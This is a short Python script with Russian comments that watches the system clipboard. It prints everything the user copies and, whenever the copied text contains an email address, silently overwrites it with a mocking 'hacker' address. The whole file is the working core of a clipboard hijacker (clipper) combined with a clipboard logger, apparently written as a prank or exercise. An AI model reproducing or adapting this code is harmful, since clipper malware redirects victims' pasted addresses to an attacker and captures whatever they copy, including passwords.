# Подключим модуль для работы с буфером обмена
import pyperclip
# Подключим модуль для работы с системным временем
import time

import re  # Регулярные выражения

from colorama import Fore, Style

# colorama.init()
# Const module colorama
RED = Fore.LIGHTRED_EX
YELLOW = Fore.LIGHTYELLOW_EX
RESET = Style.RESET_ALL


def main():
    print(YELLOW + "=" * 30 + RESET)
    # Задаем переменную old и присваиваем ей пустую строку
    old = ''
    # Начнем бесконечный цикл слежения за буфером обмена
    while True:
        # Кладем в переменную s содержимое буфера обмена
        copy_text = pyperclip.paste()
        # Если полученное содержимое не равно предыдущему, то:
        if copy_text != old:
            # печатаем его
            print(copy_text, YELLOW + "=" * 30 + RESET, sep='\n')
            # в переменную old записываем текущее пойманное значение
            # чтобы в следующий виток цикла не повторяться и не печатать то, что уже поймано
            old = copy_text
        # В конце витка цикла делаем паузу в одну секунду, чтобы содержимое буфера обмена успело прогрузиться

        pattern = r'[A-Za-z0-9_]+@[a-z]+\.[a-z]+'
        match = re.search(pattern, copy_text)
        # re.fullmatch(pattern, string)
        if match:
            # print(RED + f'match: {match} \nmatch[0]: {match[0]}\n' + RESET, YELLOW + "=" * 30 + RESET)
            pyperclip.copy('Fig_tebe@mamkin_xakep.ru')

        time.sleep(1)


if __name__ == '__main__':
    main()
    # some_mail@yandex.ru
